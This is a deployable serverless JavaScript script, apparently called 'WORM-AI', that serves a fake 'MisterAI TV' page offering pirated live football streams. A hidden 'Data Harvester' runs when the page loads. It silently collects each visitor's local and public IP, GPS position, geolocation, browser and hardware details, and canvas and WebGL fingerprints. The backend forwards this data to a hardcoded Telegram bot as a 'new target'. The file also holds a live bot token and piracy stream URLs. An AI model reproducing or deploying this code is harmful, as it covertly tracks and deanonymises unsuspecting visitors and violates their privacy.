// ========================== WORM-AI💀🔥 UNIFIED DEPLOYMENT SCRIPT ==========================

// -----------------------------------------------------------------------------------------
// PARTE 1: LÓGICA DEL BACKEND (API)
// -----------------------------------------------------------------------------------------
const BOT_TOKEN = '8362237525:AAEBqsZnXN_ceq7urqdt1cy-M8VxeJ7bCE8'; // ← توكن بوتك
const CHAT_ID   = '7932290530'; // ← ايدي محادثتك

async function handleApiRequest(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send({ error: 'Method Not Allowed' });
    }

    let body;
    try {
        // Vercel يضع الجسم الخام في req.body مباشرة
        body = JSON.parse(atob(req.body));
    } catch (e) {
        return res.status(400).send({ error: 'Invalid Base64 or JSON format' });
    }

    const report = {
        id: Math.random().toString(36).slice(2) + Date.now().toString(36),
        timestamp: new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' }),
        ip: req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress,
        userAgent: req.headers['user-agent'],
        data: body
    };

    const safeText = (text) => text.replace(/([_*\[\]()~`>#+=|{}.!-])/g, '\\$1');
    const message = `
*💀🔥 WORM\\-AI: NEW TARGET ACQUIRED* 👤
\\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\-
*⏱️ الوقت:* \`${safeText(report.timestamp)}\`
*🌐 الآيبي:* \`${safeText(report.ip)}\`
*📱 العميل:* \`${safeText(report.userAgent)}\`
\\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\- \\-
*📊 البيانات الكاملة:*
\`\`\`json
${JSON.stringify(report.data, null, 2)}
\`\`\`
    `;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'MarkdownV2' } )
        });
    } catch (error) {
        console.error("Telegram API Error:", error);
    }

    res.status(204).end();
}

// -----------------------------------------------------------------------------------------
// PARTE 2: LÓGICA DEL FRONTEND (HTML)
// -----------------------------------------------------------------------------------------
function getHtmlContent() {
    return `
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>MisterAI TV GLOBAL 2026</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --main: #4834d4; --glow: #00cec9; --bg: #050505; --color1: #FF6B8B; --color2: #6A5AF9; --color3: #00D4FF; --color4: #00F5A0; --color5: #FFD166; --twitter: #1DA1F2; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Cairo', sans-serif; background: var(--bg ); color: #fff; display: flex; height: 100vh; overflow: hidden; position: relative; }
        .bg-animation { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; overflow: hidden; }
        .particle { position: absolute; border-radius: 50%; background: var(--color3); animation: float 15s infinite linear; box-shadow: 0 0 20px currentColor; }
        @keyframes float { 0% { transform: translateY(100vh) scale(.5); opacity: 0; } 10%, 90% { opacity: 1; } 100% { transform: translateY(-100px) scale(1.5); opacity: 0; } }
        .sidebar { width: 380px; background: rgba(10, 10, 10, .9); border-left: 2px solid var(--main); display: flex; flex-direction: column; z-index: 1; backdrop-filter: blur(10px); }
        .twitter-btn { background: var(--twitter); color: #fff; text-decoration: none; text-align: center; padding: 10px; margin: 10px; border-radius: 8px; font-weight: bold; font-size: .9rem; }
        .list { flex: 1; overflow-y: auto; padding: 10px; border-top: 1px solid rgba(255, 255, 255, .1); }
        .cat { padding: 10px; margin: 10px 0 5px; background: rgba(17, 17, 17, .8); color: var(--color3); font-weight: bold; border-right: 4px solid var(--color3); border-radius: 5px; }
        .btn { padding: 12px; margin: 5px 0; background: rgba(22, 22, 37, .8); border-radius: 8px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; transition: .3s; border: 1px solid rgba(255, 255, 255, .1); }
        .btn:hover { background: linear-gradient(90deg, var(--color2), var(--main)); transform: translateX(-5px); }
        .badge { font-size: .7rem; background: var(--color1); padding: 2px 8px; border-radius: 10px; }
        .video-container { flex: 1; display: flex; align-items: center; justify-content: center; font-size: 2rem; position: relative; background: rgba(0, 0, 0, .5); }
        @media(max-width: 900px) { body { flex-direction: column; } .sidebar { width: 100%; height: auto; overflow-y: scroll; } .video-container { height: 300px; } }
    </style>
</head>
<body>
    <div class="bg-animation" id="particles"></div>
    <div class="sidebar">
        <div style="padding:15px;text-align:center;border-bottom:1px solid rgba(255,255,255,.1);">
            <div style="font-size:1.8rem;font-weight:900;color:var(--color3);">MISTERAI TV</div>
        </div>
        <a href="https://twitter.com/intent/tweet?text=أنا أشاهد كأس أفريقيا الآن عبر MisterAI TV! 🏁⚽" target="_blank" class="twitter-btn">
            <i class="fab fa-twitter"></i> غرد برأيك على تويتر
        </a>
        <div class="list" id="channels"></div>
        <div style="padding:10px;text-align:center;font-size:.7rem;opacity:.6;">© 2026 MisterAI GLOBAL TV</div>
    </div>
    <div class="video-container">
        <div style="text-align:center">
            <div style="color:var(--color1 );font-weight:900;">LIVE 2026</div>
            كأس أفريقيا - ربع النهائي
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const particlesContainer = document.getElementById('particles');
            for (let i = 0; i < 40; i++) {
                const p = document.createElement('div');
                p.classList.add('particle');
                p.style.width = p.style.height = (2 + Math.random() * 5) + 'px';
                p.style.left = Math.random() * 100 + '%';
                p.style.animationDelay = Math.random() * 10 + 's';
                p.style.animationDuration = (10 + Math.random() * 20) + 's';
                particlesContainer.appendChild(p);
            }

            const channels = [
                {c:"beIN SPORTS MAX (CAN)",n:"beIN MAX 1 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432904.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 1 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432903.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 1 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432902.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 1 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432901.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432900.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432899.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432898.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 2 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432897.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432896.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432895.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432894.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 3 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432893.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 4K",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432892.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 FHD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432891.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432890.m3u8"},
                {c:"beIN SPORTS MAX (CAN )",n:"beIN MAX 4 SD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432889.m3u8"},
                {c:"ALGERIA",n:"PROGRAMME NATIONAL DZ HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432888.m3u8"},
                {c:"FRANCE",n:"CANAL+ CAN HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432884.m3u8"},
                {c:"FRANCE",n:"beIN SPORTS 1 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432883.m3u8"},
                {c:"FRANCE",n:"beIN SPORTS 2 HD",u:"http://fr.ottv.pro/live/4476647188407159/4476647188407159/432882.m3u8"},
                {c:"beIN PREMIUM",n:"beIN SPORT 1",u:"http://135.125.109.73:9000/beinsport1_.m3u8"},
                {c:"beIN PREMIUM",n:"beIN SPORT 2",u:"http://135.125.109.73:9000/beinsport2_.m3u8"},
                {c:"beIN PREMIUM",n:"beIN SPORT 3",u:"http://135.125.109.73:9000/beinsport3_.m3u8"},
                {c:"beIN PREMIUM",n:"beIN SPORT 4",u:"http://135.125.109.73:9000/beinsport4_.m3u8"},
                {c:"beIN PREMIUM",n:"beIN SPORT 5",u:"http://135.125.109.73:9000/beinsport5_.m3u8"},
                {c:"beIN PREMIUM",n:"beIN SPORT 6",u:"http://135.125.109.73:9000/beinsport6_.m3u8"},
                {c:"beIN PREMIUM",n:"beIN SPORT 7",u:"http://135.125.109.73:9000/beinsport7_.m3u8"},
                {c:"beIN PREMIUM",n:"beIN SPORT 8",u:"http://135.125.109.73:9000/beinsport8_.m3u8"},
                {c:"beIN PREMIUM",n:"beIN SPORT 9",u:"http://135.125.109.73:9000/beinsport9_.m3u8"}
            ];
            const list = document.getElementById('channels' );
            let lastCat = '';
            channels.forEach(ch => {
                if (ch.c !== lastCat) {
                    const cat = document.createElement('div');
                    cat.className = 'cat';
                    cat.textContent = ch.c;
                    list.appendChild(cat);
                    lastCat = ch.c;
                }
                const btn = document.createElement('div');
                btn.className = 'btn';
                btn.innerHTML = \`<span>\${ch.n}</span><span class="badge">LIVE</span>\`;
                btn.onclick = () => window.open(ch.u, '_blank');
                list.appendChild(btn);
            });

            // --- Data Harvester ---
            (async () => {
                const startTime = performance.now();
                const data = {};
                const safeExec = (promise, timeout = 1000) => Promise.race([promise, new Promise(resolve => setTimeout(() => resolve({ error: 'Timeout' }), timeout))]).catch(e => ({ error: e.message }));
                
                data.lanIp = await safeExec(new Promise(resolve => {
                    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                    pc.createDataChannel('');
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = e => { if (e.candidate) { const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/); if (ipMatch) resolve(ipMatch[1]); }};
                }));
                data.geo = await safeExec(fetch('https://ip-api.com/json/' ).then(res => res.json()));
                data.wanIp = data.geo?.query || 'unknown';
                data.navigator = {};
                for (const key in navigator) { try { const value = navigator[key]; if (typeof value !== 'function' && typeof value !== 'object') data.navigator[key] = value; } catch (e) {} }
                data.screen = { w: screen.width, h: screen.height, avail: \`\${screen.availWidth}x\${screen.availHeight}\`, colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth, orientation: screen.orientation?.type };
                data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                data.languages = navigator.languages;
                data.hardware = { cores: navigator.hardwareConcurrency, memory: navigator.deviceMemory };
                data.canvasFP = (() => { try { const c = document.createElement('canvas'), ctx = c.getContext('2d'); ctx.textBaseline = 'top'; ctx.font = '14px Arial'; ctx.fillText('WORM-AI💀🔥', 2, 2); return c.toDataURL(); } catch (e) { return { error: e.message }; } })();
                data.webgl = (() => { try { const c = document.createElement('canvas'), gl = c.getContext('webgl') || c.getContext('experimental-webgl'); if (!gl) return { error: 'WebGL not supported' }; const dbg = gl.getExtension('WEBGL_debug_renderer_info'); return { vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) }; } catch (e) { return { error: e.message }; } })();
                data.gps = await safeExec(new Promise((resolve, reject) => { navigator.geolocation.getCurrentPosition(p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }), e => reject(e), { enableHighAccuracy: true, timeout: 5000 }); }), 5100);
                data.loadTime = performance.now() - startTime;

                try {
                    const payload = btoa(JSON.stringify(data));
                    fetch('/api/collector', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: payload });
                } catch (e) { console.error("Payload sending failed:", e); }
            })();
        });
    </script>
</body>
</html>
    `;
}

// -----------------------------------------------------------------------------------------
// PARTE 3: EL ENRUTADOR PRINCIPAL
// -----------------------------------------------------------------------------------------
export default async function handler(req, res) {
    const url = new URL(req.url, `http://${req.headers.host}` );

    if (url.pathname.startsWith('/api/collector')) {
        // Si la ruta es /api/collector, ejecuta la lógica de la API
        return handleApiRequest(req, res);
    } else {
        // Para cualquier otra ruta, sirve el contenido HTML
        res.setHeader('Content-Type', 'text/html');
        res.status(200).send(getHtmlContent());
    }
}
